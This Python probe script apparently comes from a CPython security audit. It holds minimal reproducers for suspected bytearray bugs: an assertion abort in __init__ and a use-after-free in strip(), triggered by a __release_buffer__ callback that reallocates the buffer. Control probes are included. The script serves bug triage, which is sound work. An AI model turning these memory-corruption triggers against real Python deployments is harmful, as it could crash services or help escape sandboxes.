"""Phase-1 lead probes for slice obj-sequences (mapper handoff to Groups A/B).

These are minimizations of two things the structural map turned up. They are
handed over as *measured leads*, not as triaged findings.

One probe per process -- several are expected to abort.
  <python> mapper_probe_leads.py init_assert
  <python> mapper_probe_leads.py strip_uaf
  <python> mapper_probe_leads.py strip_uaf_control
  <python> mapper_probe_leads.py partition_uaf
"""

import sys


def probe_init_assert():
    """bytearray___init___impl:938  assert(self->ob_exports == 0)

    Reached from pure Python with a live memoryview over an EMPTY bytearray.
    Debug build: SIGABRT. Release build (NDEBUG): assert compiled out.
    """
    b = bytearray(b"AB")
    b.clear()                 # Py_SIZE == 0, ob_alloc still > 0
    mv = memoryview(b)        # ob_exports == 1
    print("PROBE:init_assert.setup=ok", flush=True)
    try:
        b.__init__("x", "ascii")   # takes the encode path -> reaches :938
        print("PROBE:init_assert=NO_ABORT_returned", flush=True)
    except BaseException as exc:  # noqa: BLE001 - probe
        print(f"PROBE:init_assert={type(exc).__name__}", flush=True)
    mv.release()


def _mutating_exporter(victim, action):
    class Exporter:
        def __buffer__(self, flags):
            return memoryview(b"AB")

        def __release_buffer__(self, view):
            try:
                action(victim)
            except BaseException as exc:  # noqa: BLE001 - probe
                print(f"PROBE:callback_raised={type(exc).__name__}", flush=True)

    return Exporter()


def probe_strip_uaf():
    """bytearray_strip_impl_helper:2375 caches myptr, :2391 PyBuffer_Release runs
    __release_buffer__, :2392 uses myptr.

    The callback grows the bytearray far past its allocation, which forces
    _PyBytes_Resize to move the backing PyBytes. self->ob_exports is 0 during
    strip (no bump), so _canresize permits it.
    """
    b = bytearray(b"\t" * 8 + b"PAYLOADPAYLOAD" + b"\t" * 8)

    def grow(v):
        v += b"\xcc" * (1 << 20)

    exp = _mutating_exporter(b, grow)
    print("PROBE:strip_uaf.setup=ok", flush=True)
    res = b.strip(exp)
    print(f"PROBE:strip_uaf=returned len={len(res)} head={bytes(res[:16])!r}", flush=True)


def probe_strip_uaf_control():
    """Same shape, callback does NOT mutate. Isolates the mutation as the cause."""
    b = bytearray(b"\t" * 8 + b"PAYLOADPAYLOAD" + b"\t" * 8)
    exp = _mutating_exporter(b, lambda v: None)
    res = b.strip(exp)
    print(f"PROBE:strip_uaf_control=returned len={len(res)} head={bytes(res[:16])!r}", flush=True)


def probe_partition_uaf():
    """bytearray_partition_impl passes PyByteArray_AS_STRING(self) into
    stringlib_partition, which allocates via STRINGLIB_NEW. Allocation can run a
    finalizer, but there is no direct user callback -- expected to be clean.
    Recorded as the weak-path control for the strip lead.
    """
    b = bytearray(b"aaa,bbb")
    exp = _mutating_exporter(b, lambda v: v.__iadd__(b"\xcc" * (1 << 20)))
    res = b.partition(exp)
    print(f"PROBE:partition_uaf=returned {tuple(bytes(x[:8]) for x in res)!r}", flush=True)


PROBES = {
    "init_assert": probe_init_assert,
    "strip_uaf": probe_strip_uaf,
    "strip_uaf_control": probe_strip_uaf_control,
    "partition_uaf": probe_partition_uaf,
}


def main():
    which = sys.argv[1] if len(sys.argv) > 1 else None
    if which is None:
        print("usage: <python> mapper_probe_leads.py <" + "|".join(PROBES) + ">", flush=True)
        return
    print(f"PROBE:interpreter={sys.version.splitlines()[0]}", flush=True)
    PROBES[which]()
    sys.stdout.flush()


if __name__ == "__main__":
    main()
